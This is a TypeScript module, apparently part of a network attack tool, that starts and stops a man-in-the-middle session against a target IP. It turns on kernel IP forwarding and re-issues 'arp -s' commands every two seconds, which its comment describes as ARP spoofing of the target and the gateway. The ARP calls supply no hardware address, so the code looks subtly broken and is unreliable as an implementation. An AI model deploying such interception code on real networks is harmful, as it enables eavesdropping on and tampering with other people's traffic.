import { EventEmitter } from 'events';
import { spawn, ChildProcess } from 'child_process';

export const mitmEmitter = new EventEmitter();
mitmEmitter.setMaxListeners(100);

let active = false;
let session: any = null;
let arpProcs: ChildProcess[] = [];

export function isMitming() { return active; }
export function getMitmSession() { return session; }

export function startMitm(targetIp: string, gatewayIp = '192.168.0.1', iface = 'eth0') {
  if (active) return;
  active = true;
  session = { targetIp, gatewayIp, iface, startedAt: new Date().toISOString() };
  mitmEmitter.emit('any', { event: 'mitm_started', ...session });

  // ARP spoof: tell target we are the gateway, tell gateway we are the target
  function spoof() {
    if (!active) return;
    const p1 = spawn('arp', ['-s', targetIp, '-i', iface]);
    const p2 = spawn('arp', ['-s', gatewayIp, '-i', iface]);
    arpProcs.push(p1, p2);
  }

  // Enable IP forwarding
  spawn('sh', ['-c', 'echo 1 > /proc/sys/net/ipv4/ip_forward']).on('exit', () => {
    mitmEmitter.emit('any', { event: 'ip_forward_enabled' });
  });

  spoof();
  const interval = setInterval(() => { if (active) spoof(); else clearInterval(interval); }, 2000);
}

export function stopMitm() {
  active = false;
  for (const p of arpProcs) try { p.kill(); } catch {}
  arpProcs = [];
  const ended = { ...session, endedAt: new Date().toISOString() };
  session = null;
  mitmEmitter.emit('any', { event: 'mitm_stopped', session: ended });
  return ended;
}
